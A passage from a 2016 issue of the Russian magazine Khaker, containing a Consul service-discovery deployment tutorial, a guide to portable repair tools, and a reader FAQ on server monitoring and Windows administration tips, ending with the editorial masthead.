ют интерфейсы DNS, API HTTP и RPC CLI. Агент может быть запущен в одном
из двух режимов — клиентском или серверном. Клиентская часть собирает
данные об узле и сервисе и отсылает их серверу. Компоненты инфраструктуры
в поиске серверов или сервисов обращаются с запросом к любому агенту сети
Consul, который пересылает его доступному серверу. Если сервер не может
ответить на запрос, он направляет его на другие кластеры и возвращает полу-
ченный ответ.
   Агент с функциями сервера имеет расширенный список возможностей:
сбор данных от агента, обмен сообщениями о состоянии с другими сервера-
ми, автоматический выбор лидера в кластере (по алгоритму Raft), репликация
данных. Сеть Consul может использовать один сервер, но сами разработчи-
ки из HashiCorp рекомендуют, чтобы избежать потери данных, использовать
от трех до пяти серверов в дата-центре (особенности Raft: кластер из трех уз-
лов сохраняет работоспособность при выходе одного сервера). Серверы об-
разуют кластер и самостоятельно выбирают лидера, отвечающего за коорди-
нацию. Первый/единственный сервер обычно запускается в так называемом
bootstrap-режиме, то есть назначается лидером вручную, но в последующем
можно убрать эту «привилегию». Кворум для проведения операций и обеспе-
чения согласованности требуется в каждом дата-центре. При наличии несколь-
ких ДЦ в каждом создается отдельный кластер.
   Для обмена данными между агентами используется протокол gossip, позво-
ляющий не только транслировать события и запросы, но и обнаруживать нера-
ботающие узлы и уведомлять об этом остальную часть кластера. Обмен между
агентами по gossip происходит в LAN — 8301/TCP/UDP, в WAN — 8302/TCP/
UDP, RPC клиента с сервером и репликация между серверами — 8300/TCP, CLI
RPC — 8400/TCP, HTTP API — 8500/TCP, DNS-интерфейс — 8600/TCP/UDP.
   Для защиты подключения может быть использован ключ, уникальный для всех
членов кластера и TLS. Кроме управления через API и CLI, для удобного про-
смотра параметров реализован веб-интерфейс. Поддерживается интеграция
с Atlas — еще одним решением HashiCorp, позволяющим разработчикам бы-
стро развертывать приложения.

УСТАНОВКА CONSUL
Исходный код доступен на GitHub, поставляются готовые ZIP-архивы, собран-
ные для 32/64-битных и ARM-версий Windows, OS X, FreeBSD, Solaris и Linux.
Отдельно доступны ссылки на вспомогательные инструменты, в том числе раз-
работанные комьюнити, SDK и интерфейс. Здесь есть полезные решения. На-
пример, Consul Template позволяет отслеживать шаблоны и распространять их,
если обнаружены изменения. C его помощью можно легко обновлять конфигу-
рационные файлы. На GitHub поиском можно найти библиотеки для разных язы-
ков программирования, позволяющих создавать совместимые с Consul при-
ложения. Также доступны готовые образы, дающие возможность развернуть
Consul-кластер на базе Docker. Для Ubuntu есть два PPA: ppa:jbboehr/consul
и ppa:bcandrea/consul. Но в них не самая актуальная версия, хотя для простого
знакомства вполне достаточная. Кроме того, мы получаем сразу нужные кон-
фигурационные файлы и в последующем можем просто подменить бинарник
более новой версией.
   Рассмотрим развертывание при помощи официального архива. Чтобы по-
знакомиться со всеми возможностями и командами Сonsul, желательно ис-
пользовать три сервера и один клиент, минимально подойдет сервер + клиент.
   Для форматирования вывода в JSON-формате понадобится утилита jq:

$ sudo apt-get instal jq unzip
$ wget -c https://releases.hashicorp.com/consul/0.6.3/
    consul_0.6.3_linux_amd64.zip

Архив содержит единственную утилиту consul, реализующую агент. В зависи-
мости от параметров можем запускать как клиент, так и сервер. Для удобства
использования разархивируем файл в каталог, видимый переменной PATH.
В идеале следует создать учетную запись, из-под которой в последующем и за-
пускать Сonsul, но для экспериментов достаточно и того, что есть.

$ sudo unzip consul_0.6.3_linux_amd64.zip -d /usr/bin

ЗАПУСКАЕМ КЛИЕНТ
Список всех ключей можно узнать, запустив Consul без параметров, подробно
они раскрыты в документации, значение некоторых понятно из описания. Сто-
ит их изучить, чтобы затем проще было ориентироваться в возможностях.





  Параметры запуска агента Consul (начало)
  Параметры запуска агента Consul (окончание)


Например, ключ -dev позволит запустить агент в development-режиме, в кото-
ром будут выводиться основные параметры среды, — очень полезно при зна-
комстве:

$ consul agent -dev -bind 192.168.86.10

Как правило, на сервере имеется несколько сетевых интерфейсов, Consul мо-
жет определить нужный для работы автоматически, но это не всегда получается.
Поэтому лучше сразу указывать на интерфейс при помощи -bind. По умолчанию
агентом используется DNS-имя узла, но можно задать произвольное при помощи
-node. Также, если не указать, будет создан дата-центр dc1, но при необходимо-
сти его можно переопределить. Еще один важный параметр, -join, позволяет ука-
зать на сервер, к которому нужно подключиться. После подключения информация
о других агентах будет получена автоматически. Но пока у нас сервера нет.





  Запуск агента в режиме development Consul
Кроме -dev, есть еще один полезный
ключ, позволяющий просмотреть все те-
кущие установки:

$ consul info

Параметры на период знакомства и от-
ладки можно указывать в строке запуска,
но в дальнейшем лучше использовать кон-
фигурационные файлы в формате JSON,
в которых прописывать параметры работы
агента, сервисы, проверки и прочее.
  Создадим каталог для описания на-
строек.

$ sudo mkdir /etc/consul.d

Внутри при желании можно создать еще
подкаталоги, например для анонса опре-
деленных сервисов, мониторинга и про-
верки. Анонсируем сервисы. Для этого
создадим файл, в котором пропишем
веб-сервис (будем считать, что он на-
строен).

$ echo ‘{“service”: {“name”:”web”,
    “tags”:[“nginx”], “port”:80}}’
    > /etc/consul.d/web.json

Здесь анонсирован сервис на локальном    Вывод информации
узле, но таким же образом мы можем про-     о настройках агентом Consul
писать любой другой узел, указав его имя
или IP. Плюс можем задать другие ключи.

$ nano /etc/consul.d/search.json
“service”: {
  “name”: “google”,
  “Datacenter”: “dc1”,
  “tags”: [“search”],
  “Service”: “search”
  “address”: “www.google.com”,
  “port”: 80
}

Cервис можно добавить, используя API.

$ curl -X PUT -d ‘{“Datacenter”: “dc1”, “Node”: “google”, “Address”:
    “www.google.com”, “Service”: {“Service”: “search”, “Port”: 80}}’
    http://127.0.0.1:8500/v1/catalog/register

Протестировать правильность конфигурационных файлов позволяет ключ
configtest, можно указать конкретный файл или каталог.

$ consul configtest -config-dir /etc/consul.d

Если ошибок нет, используем конфигурационные файлы при запуске агента.

$ consul agent -config-dir /etc/consul.d

В отладочном выводе будет иметься информация о сервисах Web и Google.
При помощи DNS можем получить запрос всех узлов, предоставляющих сер-
вис Web.

$ dig @127.0.0.1 -p 8600 web.service.consul

Добавим тег:

$ dig @127.0.0.1 -p 8600 nginx.web.service.consul

Такой же запрос можем сделать, используя API.

$ curl http://127.0.0.1:8500/v1/catalog/service/web

Проверки доступности реализуются при помощи любых возможных механиз-
мов и команд. Например, узел проще проверить при помощи ping:

$ echo ‘{“check”: {“name”: “ping”, “script”: “ping -c1 google.com
    >/dev/null”, “interval”: “30s”}}’ > /etc/consul.d/ping.json

Веб-сервис проверяется доступностью определенной страницы. Если в ответ
получаем статус ОK, значит, все нормально. При этом Consul берет на себя
всю последующую обработку запроса.
$ echo ‘{“service”: {“name”: “web”, “port”: 80, “check”:
    {“script”: “curl localhost >/dev/null 2>&1”, “interval”:
    “10s”}}}’ >> /etc/consul.d/web.json

Перезапускаем агент и проверяем.

$ curl -s http://127.0.0.1:8500/v1/health/service/web

Клиентская часть готова.

ЗАПУСКАЕМ СЕРВЕР
Запуск агента в режиме сервера отличается добавлением одного параметра
-server. Дополнительно можем указать старт в bootstrap-режиме, то есть сами на-
значаем его главным. Если сервер один, то так и поступаем. Есть еще один похо-
жий параметр — -bootstrap-expect, после него указывается количество серверов,
подключение которых ожидаем. В этом варианте лидер выбирается автоматиче-
ски, но при условии, что будет доступен кворум для указанного числа серверов.

$ sudo consul agent -server -bootstrap-expect 3
    -data-dir /var/consul -bind=192.168.86.1 -config-dir /etc/consul.d

Аналогичным образом запускаются все остальные серверы. Если использо-
вался параметр bootstrap, то он, естественно, указывается только для одного.
Проще сразу записать все параметры в JSON-файл, который распространить
на все серверы и клиенты (фактически клиент — это «server»: false, и его можно
легко сделать сервером, изменив один параметр).

{
  “bootstrap_expect”: 3
  “server”: true,
  “datacenter”: “first”,
  “data_dir”: “/var/consul”
}

Запущенный агент, по сути представляет собой кластер из одного узла, так
как не знает о других системах. Поэтому его нужно подключить к существующе-
му кластеру. Открываем терминал и вводим, указывая через пробел IP одного
или нескольких серверов:

$ sudo consul join 192.168.86.1
В JSON-файле это соответствует параметру start_join. В ответ должны получить
сообщение о подключении к кластеру. Сразу можем просмотреть список всех
членов кластера:

$ consul members

Через API:

$ curl http://localhost:8500/v1/catalog/nodes | jq .

Список серверов через DNS:

$ dig @127.0.0.1 -p 8600 server.node.consul

Список всех серверов в кластере и текущий лидер:

$ curl -s http://localhost:8500/v1/status/peers | jq .
$ curl -s http://localhost:8500/v1/status/leader | jq .

Подробная информация об агенте:

$ curl -s http://localhost:8500/v1/agent/self | jq .





  Информация об агенте (начало)
                                           Информация об агенте (окончание)


Это простой вариант подключения. Для защиты можно сгенерировать ключ
consul keygen, который затем указывать при подключении агентов к кластеру
в параметре encrypt. Опять же проще создать файл и распространять его сре-
ди остальных агентов.

$ nano /etc/consul.d/encrypt.json
{“encrypt”: “Yuoo8956.....UinT==”}

Для определения времени запроса между двумя узлами используется коман-
да consul rtt. Для выполнения команд на удаленных узлах — consul exec. Узлы
можно указать в привязке к конкретному дата-центру, тегам, сервисам и маске
имени. Так же несложно использование key/value-хранилища. Чтобы занести
пару key1/value1, выполняем команду

$ curl -X PUT -d ‘value1’ http://localhost:8500/v1/kv/group1/key1

Данные расходятся по кластеру, и их можно просмотреть на любом агенте:

$ curl -s http://localhost:8500/v1/kv/group1/key1





                                            Использование key/value-хранилища
В ответ получим массив, в котором параметр «Value»: будет закодирован при по-
мощи Base64, чтобы раскодировать, следует использовать утилиту base64 -d.
В реализации Consul key/value поддерживает две дополнительные опции
acquire и release, обеспечивающие блокировку (показывается как LockIndex)
и модификации значения ключа (ModifyIndex и CreateIndex). Блокировку часто
используют в сессиях для реализации механизма выбора лидера.
  В ранних версиях Consul веб-интерфейс нужно было ставить отдельно. Те-
перь он является частью агента, поэтому достаточно при запуске добавить ключ
-ui, и затем можно входить, набрав в браузере http://localhost:8500/ui.
Здесь четыре вкладки, позволяющие просмотреть сервисы, узлы и ACL, про-
смотреть и создать пару в хранилище key/value. По умолчанию пароль не тре-
буется, но его можно установить в Settings.





  Веб-интерфейс Consul

ЗАКЛЮЧЕНИЕ
Как видим, Consul — это, скорее, фреймворк, на основе которого можно реа-
лизовать решение для распределенных систем, позволяющее определять сер-
висы, отслеживать события, мониторить системы, конфигурировать приложе-
ния и многое другое.
FERRUM





                  Алексей «Zemond» Панкратов
                         3em0nd@gmail.com
ВСЕ СВОЕ





ВЫБИРАЕМ ИНСТРУМЕНТЫ
ДЛЯ ПОХОДНОГО НАБОРА
Хочешь быстро разобрать залитый пивом телефон?
Зашел к подруге чинить компьютер и вдруг понял, что
позабыл инструмент? Заметил, что часто испытыва-
ешь необходимость (или как минимум острое жела-
ние) раскрутить что-нибудь по винтикам? Тогда тебе
повезло! Сегодня мы поговорим о том, как выбрать
портативный набор, который спасет тебя во многих
ситуациях и поможет заработать репутацию волшеб-
ника, чинящего технику на ходу.

Не исключено, что дома у тебя собрана куча разных отверток, бит, паяльного
оборудования, различной электроники для диагностики и прочего. Но в карма-
не все эти сокровища не умещаются, так что придется выбирать только самое
нужное. А еще лучше купить портативные версии наиболее полезных инстру-
ментов. Причем желательно универсальных — чтобы легко разбирать любые
мобильные устройства с их десятками разнообразных винтиков.

НАБОРЫ
Ты наверняка слышал про ребят из iFixit — у них огромное количество разных
инструкций, как разобрать тот или иной девайс. Кроме того что пишут руковод-
ства, они же продают разные инструменты и наборы. Их Pro Tech Toolkit — от-
личный выбор на все случаи жизни.

                                                                        Pro Tech
                                                                                         Toolkit
В нем порядка семидесяти инструментов: отвертка со сменными битами, гла-
дилки для открытия разных корпусов, антистатический браслет и многое дру-
гое. Все это упаковано в удобную сумку, которую легко бросить в рюкзак и та-
скать с собой. Удержать от покупки может только ценник: почти 65 долларов
по нынешнему курсу — это ощутимо, а если учесть, что еще почти столько же
придется заплатить за пересылку, то и вовсе многовато даже за очень хороший
набор.
   Думаю, тебе не нужно рассказывать, что такое Aliexpress. На этом виртуаль-
ном китайском развале можно найти неплохую реплику Pro Tech Toolkit — она
называется JAKEMY. Стоит она вдвое дешевле, а доставка в Россию и вовсе
бесплатная, так что есть серьезный соблазн помочь китайской экономике.

                                                 JAKEMY — найди десять
                                                        отличий от оригинала





Подобный набор хорош своей универсальностью, компактностью и мобильно-
стью. Иметь одну сумочку гораздо удобнее, чем носить все по отдельности, да
и порядок поддерживать гораздо легче.
РУЧНОЙ ИНСТРУМЕНТ
Более бюджетный вариант — это
комплект отверток или одна от-
вертка со сменными битами (что,
на мой взгляд, удобнее). Обсуж-
дать конкретные варианты бес-
смысленно — выбирать все рав-
но обычно приходится из того, что
есть в ближайшем хозяйственном.
   Стоит отметить, что отверт-
ки есть разной формы и веса.
По мне, так самые удобные — это
в меру тяжелые и узкие, хотя ко-
му-то, может, грушевидная ручка
нравится больше. Если покупа-                                  Отвертка
                                                                       со сменнымиешь впервые, не стесняйся по-
                                                                магнитными
просить достать с прилавка все,                                                                  битами
что нравится, и сравни, что будет
лучше лежать в руке.
  А вот если тебе предложат набор часовых отверток (выглядит как цельная
отвертка с разными наконечниками), не соглашайся ни в коем случае. Пользо-
ваться этой штукой дико неудобно: если понадобится бороться с плотно закру-
ченными на заводе винтами, без плоскогубцев не обойтись — иначе сотрешь
себе пальцы до мяса.


                                                        Набор часовых отвер-
                                                                        ток, самый жуткий
                                                             инструмент для пальцев
При покупке обрати внимание на наличие удлинителя биты. Вещь реально нуж-
ная, особенно когда будешь разбирать корпус компьютера (или чего-нибудь
еще) — длины в таких случаях часто не хватает.
  В общем, отвертка — твой верный спутник, и, даже если ничего с собой боль-
ше нет, благодаря набору бит ты сможешь разобрать (и, возможно, собрать
обратно) массу самых разных вещей. Кстати, биты можно докупать — только
смотри, чтобы они были совместимы.

ИНСТРУМЕНТ ДЛЯ ВСКРЫТИЯ
Наборы из гладилок и прочего пластикового инструмента, нужного для вскры-
тия корпусов мобильных девайсов, можно купить отдельно. Вот, к примеру,
типичный инструмент для вскрытия.





  Различные инструменты для вскрытия корпусов


На первый взгляд кажется, что любой корпус можно открыть пластиковой
картой, но, когда попробуешь нормальные инструменты, к подручным сред-
ствам вернешься разве что в крайнем случае. Карточка, конечно, тоже может
пригодиться, но пластиковые скребки, палки и медиаторы бывают невероят-
но удобными. Они сделаны из более мягкого пластика, чем корпуса устройств,
и при вскрытии деформируется он, а не корпус гаджета. Это помогает избе-
жать зазубрин и других поломок. Гладилки же, наоборот, сделаны из металла,
прочны и служат для самых разных целей: что-то подковырнуть, поправить ка-
кой-то шлейф или нанести какую-нибудь пасту. Кстати, гладилки и различные
зонды — это изначально стоматологические инструменты, которые пришлись
очень к месту при работе с мелкой электроникой.



                                                     Гладилка



МУЛЬТИТУЛЫ
Говоря об инструментах, нельзя не вспомнить такую крутую штуку, как мульти-
тул. Думаю, ты подобные видел. Чаще всего это плоскогубцы, в ручках которых
прячутся другие инструменты: отвертки, ножницы, ножи, открывалки и прочее.
Частенько у мультитулов есть отдельный блок под биты и отвертка, которая ле-
жит в одном чехле с ножом.
  Два  знаменитых  производите-
ля мультитулов — это Leatherman
и Victorinox. Кто из них круче, ска-
зать сложно, но холивары на фору-
мах бывают пожарче, чем в ветках,
посвященных ОС или языкам про-
граммирования. Кроме  этих  двух
титанов, есть и китайские произво-
дители аналогичных инструментов
самых разнообразных форм и, ко-
нечно, качества. Если деньги есть,
бери бренд, если нет, но поиграться                                       Пример мультитула
хочется, выбирай, что больше при-
глянется.
   Главное — обрати внимание на набор встроенных в мультитул инструмен-
тов: их должно быть много, и они должны подходить под твои задачи. Брать нож
с тремя шлицами не совсем логично, особенно если ты хочешь раскручивать
коммутационные шкафы. И конечно, очень важный критерий — это сталь ин-
струмента. Если она совсем плохого качества, то пойдет стружкой от первого
же прикипевшего болтика.
Возможно, это прозвучит забавно, но одна из полезнейших вещей в сумке лю-
бого человека независимо от рода его деятельности — это темляк. Для тех, кто
не в курсе, поясню, что это своего рода брелок или браслет, который плетут
из паракорда. Может показаться, что это просто забавная самодельная игруш-
ка, которая болтается на брелоке. Но на деле, если ее развязать, получится
в среднем пять метров крепкого шнура. Он незаменим на самых разных вы-
ездах, когда нужно что-то подвязать или подвесить, но иногда ему находится
применение и в обычное время. Сплести такую штуку довольно просто, а схему
ты с легкостью нагуглишь.
ПРОЧЕЕ
Если тебе приходится заглядывать в сетевые шкафы, зачищать провода и за-
делывать контакты в розетки или панели, то тебе должен понравиться вот такой
инструмент для зачистки витой пары.
   Конечно,  на  профессиональный  уровень  он
не претендует, и даже самый обычный нож
для заделки проводов даст ему сто очков
форы по удобству и качеству. Зато
он маленький, легкий и прак-
тичный — то, что надо,
если ты собираешь
портативный
набор.





                                                  Инструмент
                                                 для зачистки витой
                                             пары и заделки
                                                    контактов типа
                                                      110/88
FAQ



                                        Алексей Zemond
                                            Панкратов
                                           3em0nd@gmail.com

FAQ
   ОТВЕТЫ НА ВОПРОСЫ
       ЧИТАТЕЛЕЙ

               (ЕСТЬ ВОПРОСЫ? ШЛИ НА FAQ@GLC.RU)
МОНИТОРИМ СОБЫТИЯ, ПРОИСХОДЯЩИЕ НА СЕРВЕРЕ
Поговорим про разные инструменты мониторинга серверов — от заезженного
Zabbix’а до более легковесного решения Munin.
  Не секрет, что средства мониторинга придуманы не просто так и в рабо-
те любого айтишника играют важную роль. Даже при маленьком парке машин
мониторинг помогает решать задачи значительно быстрее. Плюс есть возмож-
ность отслеживать все возможные тенденции и рисовать красивые графики.
Давай посмотрим, какие средства выбрать, если речь как раз о небольшом
числе серверов.





                                                                           Nagios

Поднимать и настраивать Nagios в таком случае излишне. Это, конечно, класс-
ная система, и настроек в ней огромное количество, но в нашем случае это
скорее минус — равно как ее громоздкость.
                                                                               Zabbix


Многие по старой памяти ставят Zabbix. Эта программа не так давно обно-
вилась, стала выглядеть интереснее, обрела некоторые любопытные фишки,
да и работает стабильнее. Zabbix не так неуклюж, как Nagios, но это, конечно,
дело вкуса. Мощная система к тому же пригодится, если есть перспектива ро-
ста, — по крайней мере ты не упрешься в отсутствие нужных функций. Zabbix
и Nagios объединяет то, что для своей работы они требуют установки базы дан-
ных. Если для тебя это неудобно, можешь посмотреть в сторону Munin.
                                                                      Munin


Munin — это свободный проект, написанный на Perl. Он мониторит боль-
шинство параметров, прост в установке и использовании. Отображает
красивые и понятные графики и имеет модульную архитектуру. Существует
огромная коллекция готовых плагинов, но можешь писать и сам — на Bash,
Perl, Ruby, Python или любом другом языке программирования. Если машин
немного, то я советую именно Munin как лайтовое, но при этом расширяемое
решение.



УВЕЛИЧИВАЕМ КЕШ DNS В WINDOWS
Как известно, при обращении к любому ресурсу система первоначально загля-
дывает в кеш — на тот случай, если запись о соотношении доменного имени
и IP уже существует. Иногда бывает полезно расширить этот кеш.
   Посмотреть записи можно командой ipconfig /displaydns. Записи в кеше
могут быть двух видов: «позитивные» и «негативные». «Негативная» запись оз-
начает, что совпадение найдено не было, и при переходе на сайт браузер вы-
даст сообщение о том, что не удается найти сервер или DNS. К примеру, ты
пингуешь example.xakep.ru — система получит ответ о том, что такого ресур-
са не существует, и будет хранить результат в своем кеше.
   Если в период хранения эта ссылка заработает, то пройти по ней ты не смо-
жешь до тех пор, пока запись не обновится. Чтобы обновить записи вручную,
можешь набрать команду ipconfig /flushdns. Также они обновляются через рав-
ные временные интервалы — они задаются в реестре при помощи переменной
NegativeCacheTime. Если хочешь изменить ее значение, ищи вот эту ветку.

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters

Можно подтюнить и остальные параметры. Например, вот так:

CacheHashTableBucketSize = 1
NegativeCacheTime = 300
CacheHashTableSize = 384
MaxCacheEntryTtlLimit = 86400
MaxSOACacheEntryTtlLimit = 301





                                                       Пример параметров

Значение MaxCacheEntryTtlLimit задает максимальное время кеширова-
ния для позитивных ответов и измеряется в секундах. Для негативных значений
используется параметр NegativeCacheTime. Остальные параметры задают
размер таблиц кеша. Конечно, ждать огромного прироста в скорости загрузки
страниц не стоит, но обработка запросов может заметно ускориться.
ПОДКЛЮЧАЕМ СКАНЕР РАСШАРЕННОГО ПРИНТЕРА ПО СЕТИ
Частенько бывает нужно расшарить принтер, чтобы им могли пользоваться не-
сколько человек. Задача несложная — пара кликов мыши, и вот уже весь офис
может печатать вовсю, главное, чтобы нужный компьютер был включен. А вот
когда просят так же расшарить сканер, выходит совсем иначе. Чаще всего
единственный ответ на такую просьбу — это «увы, нельзя». Но на самом деле
организовать удаленный доступ к сканеру вполне возможно, и сейчас расска-
жу, как это сделать.
   Все, что нужно, — это специальная программа. Ее суть проста: на компьюте-
ре, к которому подключено МФУ или сканер, устанавливается серверная часть,
которая отвечает на запросы клиентов. Получается что-то вроде виртуального
сканера.





                                                Окно сканирования RemoteScan
Одна из таких программ — RemoteScan. После установки сервера она автома-
тически выберет дефолтный сканер и сама расшарит его. После этого можно
приступать к установке клиентов. Когда инсталлятор отработает, не ищи в трее
активный значок программы. У нее нет своего интерфейса, и для использова-
ния достаточно воспользоваться любой программой для сканирования. Про-
сто выбирай RemoteScan в списке сканеров.
   Главный минус RemoteScan в том, что за него просят денег. Но можно при-
смотреться и к условно бесплатному аналогу — BlindScanner.





                                                   Окно настроек BlindScanner

Эти две программы схожи по функциям и принципу работы. Стоит упомянуть,
что у BlindScanner есть русская локализация, да и выглядит он посимпатичнее.
Как видишь, пусть и со сторонними утилитами, но расшарить сканер вполне
реально. Как ни странно, дело обходится даже без шаманских плясок с бубном.
ДОБАВЛЯЕМ УТИЛИТУ ОЧИСТКИ ДИСКА В WINDOWS SERVER
2008 И 2012
После того как в системе забивается память и свободного места катастрофи-
чески не хватает, на помощь придет утилита очистки системы. Однако в сер-
верные версии ОС она по дефолту не входит. Но это можно исправить!
   Утилиту можно поставить несколькими способами. Первый, пожалуй, наи-
более простой — через оснастку сервера. Для этого нужно установить возмож-
ности рабочего стола. На скриншоте показано, как это сделать.





                                               Роль возможности рабочего стола

Стоит отметить, что, кроме полезной утилиты очистки, ставятся дополнительные
прибамбасы: календарь, почтовик, Windows Media Player и Windows SideShow. На
сервере они не нужны, поэтому рекомендую второй способ — скопировать утилиту
непосредственно из системной папки Windows. Для начала ищем нужные файлы.

C:\Windows\winsxs\amd64_microsoft-windows-cleanmgr_
    31bf3856ad364e35_6.1.7600.16385_none_c9392808773cd7da\cleanmgr.exe
C:\Windows\winsxs\amd64_microsoft-windows-cleanmgr.resources_
31bf3856ad364e35_6.1.7600.16385_en-us_b9cb6194b257cc63\cleanmgr.exe.mui
Копируем  их  в  два  каталога: %systemroot%\System32 и %systemroot%\
System32\en-US. Если система с русификацией, то вместо второго будет
\ru-RU. После этого утилиту очистки диска можно запускать привычной коман-
дой Cleanmgr.
   Ну и наконец, можно поставить роль возможности рабочего стола на те-
стовую машину, а потом взять утилиту из нее. По указанным выше путям будут
лежать файлы cleanmgr.exe.mui и cleanmgr.exe. После копирования можно
пользоваться утилитой.

ИЩЕМ ЛОГИ ФАЙРВОЛА В WINDOWS
Многих ставит в тупик то, как работает файрвол в Windows. Вроде все правила
настроил, трафик должен идти, а в итоге соединения нет. И самое непонят-
ное — это где посмотреть, что же происходит. На самом же деле ничего слож-
ного нет — нужно только знать, где лежат логи и как с ними обращаться.
   Разберемся на примере Windows 8.1 — если поймешь принцип, то сможешь
без труда найти нужные файлы и в других версиях ОС. Для начала открываем
панель управления и заходим в пункт «Брандмауэр Windows». Теперь нам ну-
жен пункт «Дополнительные параметры».





                                                  Дополнительные параметры


После этого открывается окно правил, в котором нас интересует правая часть.
На ней ищем пункт «Свойства».
                                                                       Свойства


В окне свойств находим ведение журнала и заветную кнопку «Настроить».





                                                           Ведение журнала
Здесь и начинается самое интересное. Первое, что бросается в глаза, — это
путь к текстовому файлу, в котором как раз и хранятся наши логи:

%systemroot%\system32\LogFiles\Firewall\pfirewall.log

  Можно указать предельный размер лога и еще пару параметров. Давай
посмотрим, что же лежит по этому пути. На картинке показан примерный вид
файла.





                                                                                        pfirewall.log

Можно, конечно, и такой файл смотреть через блокнот или, скажем, с помощью
консоли грепать нужные события. Но говорить об удобстве в таком случае не
приходится. Куда лучше сделать журнал через групповую политику, чтобы по-
том его просматривать.
1. Открываем оснастку «Управление групповой политикой», в дереве консоли
   разворачиваем узел «Лес: [название леса]», узел «Домены», затем узел с
   названием нашего домена, после чего узел объекта групповой политики. На
   узле кликаем правой кнопкой и выбираем пункт «Создать».
                                             Создаем объект групповой политики


2. Имя можно задать любое, пусть это будет «Правила файрвола».
3. Нажимаем на него правой кнопкой мыши, «Изменить».
4. Переходим в редактор управления групповой политики. Заходим в ветку
   «Конфигурация компьютера\Политики\Конфигурация Windows\Параметры
   безопасности\Брандмауэр Windows в режиме повышенной безопасности»,
   переходим в свойства.
                           Брандмауэр Windows в режиме повышенной безопасности


5. Теперь устанавливаем наши настройки на размер журнала и его имя. После
   чего сохраняемся и закрываем окно.
6. Остается связать созданный объект групповой политики с подразделением,
  содержащим учетные записи компьютеров, для которых должны применять-
   ся параметры текущего объекта групповой политики. Это делается через уже
   открытую оснастку управления групповой политикой. Нужно выбрать под-
   разделение, содержащее учетные записи компьютеров, для которых будет
   вестись журналирование брандмауэра Windows, кликнуть правой кнопкой
  мышки и из контекстного меню выбрать команду «Связать существующий
   объект групповой политики». В отобразившемся диалоговом окне «Выбор
   объекта групповой политики» выбрать объект и нажать на кнопку OK.





                          Связываем объект групповой политики с подразделением


Теперь можно с комфортом анализировать ошибки файрвола на пользователь-
ском компьютере.
ВОЗВРАЩАЕМ ОТОБРАЖЕНИЕ ЭСКИЗОВ ИЗОБРАЖЕНИЙ
В WINDOWS 7
В Windows файлы картинок отображаются в виде маленьких эскизов. Но быва-
ет, что вместо них показываются одинаковые значки. Сейчас расскажу, как все
исправить.





                                                        Пример проблемы

Чтобы вернуть отображение превью, необходимо немного подредактировать
параметры отображения папок. Для этого открываем параметры папок — мож-
но сделать это через панель управления или через пункт «Параметры» любой
открытой папки.





                                                          Панель управления
Переходим на вкладку «Вид» и смотрим внимательно на пункт «Всегда отобра-
жать значки, а не эскизы». Снимаем галку и сохраняем изменения.





                                                          Параметры папок


   Готово — превью вернулись!
                                   18+





  № 4 (207)
                     Илья Русанен            Алексей Глазков
                      Главный редактор         Выпускающий редактор
                          rusanen@glc.ru                  glazkov@glc.ru

                 Андрей Письменный        Евгения Шарипова
                       Шеф-редактор           Литературный редактор
                         pismenny@glc.ru


                      РЕДАКТОРЫ РУБРИК
      Андрей Письменный       Антон «ant» Жуков           Александр «Dr.»
     PC ZONE, СЦЕНА, UNITS          ВЗЛОМ                 Лозовский
          pismenny@glc.ru              zhukov@glc.ru            MALWARE, КОДИНГ,
                                                           PHREAKING
                                                                         lozovsky@glc.ru       Юрий Гольцев           Евгений Зобнин
          ВЗЛОМ                  X-MOBILE
            goltsev@glc.ru                zobnin@glc.ru

        Илья Русанен           Павел Круглов
           КОДИНГ              UNIXOID и SYN/ACK
           rusanen@glc.ru                kruglov@glc.ru


                        MEGANEWS
                             Мария Нефёдова
                                  nefedova.maria@gameland.ru



                               АРТ
                                Анна Королькова            Алик Вайнер
                                      Верстальщик                 Обложка
                                  цифровой версии


                          РЕКЛАМА
                            Мария Самсоненко
                                Менеджер по рекламе
                                      samsonenko@glc.ru


                РАСПРОСТРАНЕНИЕ И ПОДПИСКА
                       Подробная информация по подписке: info@glc.ru
                                 Отдел распространения
                                Наталья Алехина (lapina@glc.ru)
                          Адрес для писем: Москва, 109147, а/я 50




В случае возникновения вопросов по качеству печати: claim@glc.ru. Адрес редакции: 115280, Москва, ул. Ленинская Слобода, д. 19, Омега плаза. Изда-
тель: ООО «Эрсиа»: 606400, Нижегородская обл., Балахнинский р-н, г. Балахна, Советская пл., д. 13. Учредитель: ООО «Принтер Эдишионс», 614111,
Пермский край, г. Пермь, ул. Яблочкова, д. 26. Зарегистрировано в Федеральной службе по надзору в сфере связи, информационных технологий и массо-
вых коммуникаций (Роскомнадзоре), свидетельство ПИ № ФС77-56756 от 29.01.2014 года. Мнение редакции не обязательно совпадает с мнением авто-
ров. Все материалы в номере предоставляются как информация к размышлению. Лица, использующие данную информацию в противозаконных целях,
могут быть привлечены к ответственности. Редакция не несет ответственности за содержание рекламных объявлений в номере. По вопросам лицензи-
рования и получения прав на использование редакционных материалов журнала обращайтесь по адресу: xakep@glc.ru. © Журнал «Хакер», РФ, 2016